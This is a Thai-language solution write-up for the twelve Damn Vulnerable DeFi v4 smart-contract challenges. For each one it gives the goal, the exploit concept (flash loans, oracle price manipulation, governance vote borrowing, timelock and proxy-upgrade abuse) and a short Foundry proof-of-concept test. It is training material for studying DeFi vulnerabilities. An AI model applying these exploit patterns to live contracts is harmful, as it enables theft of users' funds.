# Damn Vulnerable DeFi v4 สรุปการแก้บัค
by tinamints

## 1. Unstoppable
### เงื่อนไข :
- หยุดการทำงานของ vault
### คอนเซ็ป :
-  แฟลชโลน
-  DoS
### วิธีแก้ :
- ส่งโทเคนโดยตรง (ไม่ผ่าน `deposit`) เพื่อทำให้ `convertToShares(totalSupply) != balanceBefore` เป็นจริงและเกิด revert เนื่องจาก `totalSupply` อัปเดตได้เฉพาะผ่าน `deposit` เท่านั้น
### POC
` function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
`

## 2. Naive Receiver
### เงื่อนไข :
- กู้คืนเงินทั้งหมดใน pool
- ทำให้เสร็จภายใน 2 ทรานแซกชัน
### คอนเซ็ป :
-  แฟลชโลน
### วิธีแก้ :
- ระบุ receiver เป็นเป้าหมายให้ค่าธรรมเนียมดูด ETH จนหมด แล้วปลอมตัวเป็น feeReceiver เพื่อถอน WETH ที่สะสมไว้
### POC
` function test_naiveReceiver() public checkSolvedByPlayer {
    
        bytes[] memory data = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            data[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), 
                address(weth),
                0, 
                ""
            );
        }
       
        pool.multicall(data);

        
        vm.startPrank(address(deployer));
        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
        vm.stopPrank();
       
    }`

## 3. Truster
### เงื่อนไข :
- กู้คืนเงินทั้งหมดไปยัง recovery
- ทำให้เสร็จใน 1 tx
### คอนเซ็ป :
-  แฟลชโลน
-  ค่าที่ไม่ได้ตรวจสอบ
### วิธีแก้ :
- ตั้ง `target` เป็น pool และส่ง `approve` เป็น `data` เพื่อให้ pool อนุมัติให้ผู้โจมตีใช้โทเคนของ pool เอง
### POC
`function test_truster() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
        attacker.attack();

    }`

## 4. Side Entrance
### เงื่อนไข :
- กู้คืน ETH ทั้งหมดไปยัง recovery
### คอนเซ็ป :
-  แฟลชโลนแบบมีหลักประกัน
### วิธีแก้ :
- ใช้ประโยชน์จากการที่ `execute` ถูกเรียกระหว่างแฟลชโลน เพื่อฝาก ETH ที่ยืมมากลับเข้า pool เพิ่ม `balance` และได้สิทธิ์เรียก `withdraw` ในภายหลัง
### POC
` function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);

        exploit.exploit();

    }

`

## 5. The Rewarder
### เงื่อนไข :
- กู้คืนเงินให้ได้มากที่สุดไปยัง recovery
- ต้องอยู่ใน beneficiaries เพื่อโต้ตอบกับ distributor
### คอนเซ็ป :
-  การแจกจ่ายแบบจำกัดสิทธิ์
-  ระบบมาร์เคิลทรี
### วิธีแก้ :
- ใช้ประโยชน์จากการที่ `claimRewards()` ไม่ทำเครื่องหมายการเรียกร้องว่าใช้แล้ว จึงสามารถเรียกร้องโทเคนเดิมซ้ำหลายครั้งในการเรียกเดียวเพื่อดึงเงินทั้งหมด
### POC
` function test_theRewarder() public checkSolvedByPlayer {
        
        string memory dvtJson = vm.readFile(
            "test/the-rewarder/dvt-distribution.json"
        );
        Reward[] memory dvtRewards = abi.decode(
            vm.parseJson(dvtJson),
            (Reward[])
        );
        
        string memory wethJson = vm.readFile(
            "test/the-rewarder/weth-distribution.json"
        );
        Reward[] memory wethRewards = abi.decode(
            vm.parseJson(wethJson),
            (Reward[])
        );
        
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        
        for (uint i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;
                playerWethAmount = wethRewards[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }
        require(playerDvtAmount > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        
        uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT /
            playerDvtAmount) +
            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        
        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));

    }`

## 6. Selfie
### เงื่อนไข :
- ดึงโทเคนทั้งหมดออกจาก pool ไปยัง recovery
### คอนเซ็ป :
-  แฟลชโลน
-  การปลอมแปลงอำนาจโหวต governance
### วิธีแก้ :
- ยืมโทเคนของ pool ผ่านแฟลชโลนเพื่อได้อำนาจโหวตส่วนใหญ่ชั่วคราว คิว `emergencyExit` เป็น governance action คืนโลน รอ 2 วัน แล้วรัน action
### POC
` function test_selfie() public checkSolvedByPlayer {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
    }
`

## 7. Compromised
### เงื่อนไข :
- ดึง ETH ทั้งหมดออกจาก exchange ไปยัง recovery
- ผู้เล่นต้องไม่มี NFT
- ราคา NFT ต้องไม่เปลี่ยนแปลง
### คอนเซ็ป :
-  การปลอมแปลงราคา oracle
-  การรั่วไหลของ private key
### วิธีแก้ :
- ถอดรหัส private key จากข้อความ hex ใน README ของ oracle 2 แหล่ง ตั้งราคา NFT เป็น 0 ซื้อด้วย 1 wei คืนราคาเป็น 999 ETH ขาย NFT แล้วส่ง ETH ไปยัง recovery
### POC
` function test_compromised() public checkSolved {
        vm.prank(source1); oracle.postPrice("DVNFT", 0);
        vm.prank(source2); oracle.postPrice("DVNFT", 0);
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();
        nft.approve(address(exchange), nftId);
        vm.stopPrank();
        vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.startPrank(player);
        exchange.sellOne(nftId);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
`

## 8. Puppet
### เงื่อนไข :
- ดึง DVT 100k ทั้งหมดออกจาก lending pool ไปยัง recovery
- ทำให้เสร็จใน 1 ทรานแซกชัน
### คอนเซ็ป :
-  การปลอมแปลงราคา oracle ของ Uniswap V1
-  EIP-2612 permit
### วิธีแก้ :
- ทุ่ม DVT 1000 ของผู้เล่นเข้า Uniswap V1 เพื่อทำให้ราคาโทเคนดิ่ง ทำให้ `calculateDepositRequired` ต้องการหลักประกันแทบเป็นศูนย์ แล้วยืมโทเคนทั้งหมดใน 1 tx โดยใช้ permit
### POC
` function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
            address(token), address(lendingPool), address(uniswapV1Exchange), recovery
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }
`

## 9. Puppet V2
### เงื่อนไข :
- ดึง DVT 1M ทั้งหมดออกจาก lending pool ไปยัง recovery
### คอนเซ็ป :
-  การปลอมแปลงราคา oracle ของ Uniswap V2
-  หลักประกัน WETH
### วิธีแก้ :
- ขาย DVT 10k ของผู้เล่นทั้งหมดเข้า Uniswap V2 เพื่อทำให้ราคา DVT ดิ่ง แล้วยืมโทเคน 1M ด้วยหลักประกัน WETH ที่น้อยมาก
### POC
` function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
        weth.deposit{value: ethBalance}();
        weth.approve(address(lendingPool), requiredWETH);
        lendingPool.borrow(poolTokens);
        token.transfer(recovery, token.balanceOf(player));
    }
`

## 10. Free Rider
### เงื่อนไข :
- ดึง NFT ทั้ง 6 ชิ้นออกจาก marketplace
- ผู้เล่นได้รับ bounty (45 ETH)
### คอนเซ็ป :
-  แฟลชโลน Uniswap V2
-  บั๊กในลอจิกการซื้อของ NFT marketplace
### วิธีแก้ :
- ยืม 15 ETH (ราคา NFT 1 ชิ้น) จากแฟลชโลน บั๊กใน marketplace คือตรวจ `msg.value >= price` แค่ครั้งเดียวแต่ซื้อได้ทั้ง 6 ชิ้น และส่ง ETH คืนให้ผู้ซื้อแทนผู้ขาย ซื้อทั้ง 6 ชิ้นด้วย 15 ETH ส่งไปยัง recoveryManager เพื่อรับ bounty 45 ETH
### POC
` function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace), address(recoveryManager), address(nft),
            address(uniswapPair), address(token), address(weth), address(player)
        );
        attacker.flashLoanInitilizer(15 ether);
    }
`

## 11. Backdoor
### เงื่อนไข :
- ดึง DVT 40 ทั้งหมดไปยัง recovery
- ทำให้เสร็จใน 1 ทรานแซกชัน
### คอนเซ็ป :
-  Safe proxy factory
-  การแทรกคำสั่งในช่วง setup
### วิธีแก้ :
- ใช้ฟิลด์ `initializer` ของ `createProxyWithCallback` เพื่อแทรก `approve` ระหว่าง `setup()` ของ Safe เมื่อ WalletRegistry ส่ง DVT 10 ให้ wallet ใหม่ ผู้โจมตีก็ `transferFrom` ทันที ทำซ้ำสำหรับผู้ใช้ทั้ง 4 คน
### POC
` function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory), address(singletonCopy),
            address(walletRegistry), address(token), recovery, users
        );
    }
`

## 12. Climber
### เงื่อนไข :
- ดึง DVT 10M ทั้งหมดออกจาก vault ไปยัง recovery
### คอนเซ็ป :
-  บั๊กของ timelock ที่รันก่อนตรวจสอบ schedule
-  การอัพเกรด UUPS proxy
### วิธีแก้ :
- `execute()` รันแอคชันก่อนตรวจสอบว่า schedule ไว้หรือยัง รัน batch: ①ตั้ง delay เป็น 0 ②มอบ proposer role ให้ attacker ③อัพเกรด vault เป็น implementation อันตราย ④เรียก `schedule` ย้อนหลังจากภายใน callback จากนั้นเรียก `sweepFunds` บน vault ที่อัพเกรดแล้ว
### POC
` function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)), payable(address(timelock)), recovery, address(token)
        );
        attackContract.attack(address(maliciousImpl));
    }
`
